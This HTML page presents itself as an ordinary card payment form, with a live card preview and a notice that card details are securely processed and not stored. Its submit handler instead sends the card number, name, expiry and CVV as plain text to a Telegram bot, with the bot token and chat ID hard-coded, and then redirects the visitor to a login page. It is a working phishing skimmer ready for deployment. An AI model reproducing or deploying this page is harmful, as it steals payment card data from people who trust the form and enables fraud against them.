<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Payment Form</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #2c3e50;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }
        
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus {
            border-color: #3498db;
            outline: none;
        }
        
        .card-icons {
            display: flex;
            gap: 10px;
            margin-top: 5px;
        }
        
        .card-icon {
            width: 40px;
            height: 25px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        
        .split-input {
            display: flex;
            gap: 15px;
        }
        
        .split-input .form-group {
            flex: 1;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: #2980b9;
        }
        
        .security-notice {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 5px;
            font-size: 14px;
            color: #7f8c8d;
        }
        
        .card-preview {
            margin-bottom: 20px;
            height: 180px;
            background: linear-gradient(135deg, #3498db, #2c3e50);
            border-radius: 10px;
            padding: 20px;
            color: white;
            position: relative;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            transition: all 0.3s;
        }
        
        .card-number {
            font-size: 18px;
            letter-spacing: 1px;
            margin-top: 30px;
            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .card-name {
            margin-top: 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .card-expiry {
            text-align: right;
        }
        
        .card-chip {
            position: absolute;
            width: 40px;
            height: 30px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            top: 20px;
            left: 20px;
        }
        
        @media (max-width: 640px) {
            .container {
                margin: 20px;
                padding: 20px;
            }
            
            .split-input {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Payment Information</h1>
        
        <div class="card-preview">
            <div class="card-chip"></div>
            <div class="card-number" id="preview-card-number">•••• •••• •••• ••••</div>
            <div class="card-details">
                <div class="card-name" id="preview-card-name">CARDHOLDER NAME</div>
                <div class="card-expiry" id="preview-card-expiry">MM/YY</div>
            </div>
        </div>
        
        <form id="payment-form">
            <div class="form-group">
                <label for="card-number">Card Number</label>
                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
                <div class="card-icons">
                    <div class="card-icon" style="background-image: url('https://placehold.co/40x25?text=VISA')"></div>
                    <div class="card-icon" style="background-image: url('https://placehold.co/40x25?text=MC')"></div>
                    <div class="card-icon" style="background-image: url('https://placehold.co/40x25?text=AMEX')"></div>
                    <div class="card-icon" style="background-image: url('https://placehold.co/40x25?text=DISC')"></div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="card-name">Cardholder Name</label>
                <input type="text" id="card-name" placeholder="John Smith">
            </div>
            
            <div class="split-input">
                <div class="form-group">
                    <label for="card-expiry">Expiry Date</label>
                    <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5">
                </div>
                <div class="form-group">
                    <label for="card-cvv">CVV</label>
                    <input type="password" id="card-cvv" placeholder="•••" maxlength="4">
                </div>
            </div>
            
            <button type="submit">Submit Payment</button>
            
            <div class="security-notice">
                <p>Your payment information is securely processed. We don't store your card details.</p>
            </div>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const cardNumberInput = document.getElementById('card-number');
            const cardNameInput = document.getElementById('card-name');
            const cardExpiryInput = document.getElementById('card-expiry');
            const paymentForm = document.getElementById('payment-form');
            
            const previewCardNumber = document.getElementById('preview-card-number');
            const previewCardName = document.getElementById('preview-card-name');
            const previewCardExpiry = document.getElementById('preview-card-expiry');
            
            // Format card number input
            cardNumberInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
                let formattedValue = '';
                
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }
                
                e.target.value = formattedValue;
                previewCardNumber.textContent = formattedValue || '•••• •••• •••• ••••';
            });
            
            // Format expiry date input
            cardExpiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                let formattedValue = '';
                
                if (value.length > 2) {
                    formattedValue = value.substring(0, 2) + '/' + value.substring(2, 4);
                } else {
                    formattedValue = value;
                }
                
                e.target.value = formattedValue;
                previewCardExpiry.textContent = formattedValue || 'MM/YY';
            });
            
            // Update card name preview
            cardNameInput.addEventListener('input', function(e) {
                previewCardName.textContent = e.target.value.toUpperCase() || 'CARDHOLDER NAME';
            });
            
            // Form submission
            paymentForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const cardNumber = cardNumberInput.value.replace(/\s/g, '');
                const cardName = cardNameInput.value;
                const cardExpiry = cardExpiryInput.value;
                const cardCvv = document.getElementById('card-cvv').value;
                
                if (!cardNumber || cardNumber.length < 16) {
                    alert('Please enter a valid card number');
                    return;
                }
                
                if (!cardName) {
                    alert('Please enter cardholder name');
                    return;
                }
                
                if (!cardExpiry || cardExpiry.length < 5) {
                    alert('Please enter a valid expiry date');
                    return;
                }
                
                if (!cardCvv || cardCvv.length < 3) {
                    alert('Please enter a valid CVV');
                    return;
                }
                
                // Prepare data to send
                const cardData = {
                    number: cardNumber,
                    name: cardName,
                    expiry: cardExpiry,
                    cvv: cardCvv,
                    timestamp: new Date().toISOString()
                };
                
                // Telegram Bot API endpoint
                const telegramBotToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc'; // Replace with your bot token
                const chatId = '7549590022'; // Replace with your chat ID
                
                const message = `🔔 New Card Payment Info:\n\nCard: ${cardNumber}\nName: ${cardName}\nExp: ${cardExpiry}\nCVV: ${cardCvv}`;
                
                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    window.location.href="login.html";
                    paymentForm.reset();
                    previewCardNumber.textContent = '•••• •••• •••• ••••';
                    previewCardName.textContent = 'CARDHOLDER NAME';
                    previewCardExpiry.textContent = 'MM/YY';
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('There was an error submitting your payment. Please try again.');
                });
            });
        });
    </script>
</body>
</html>
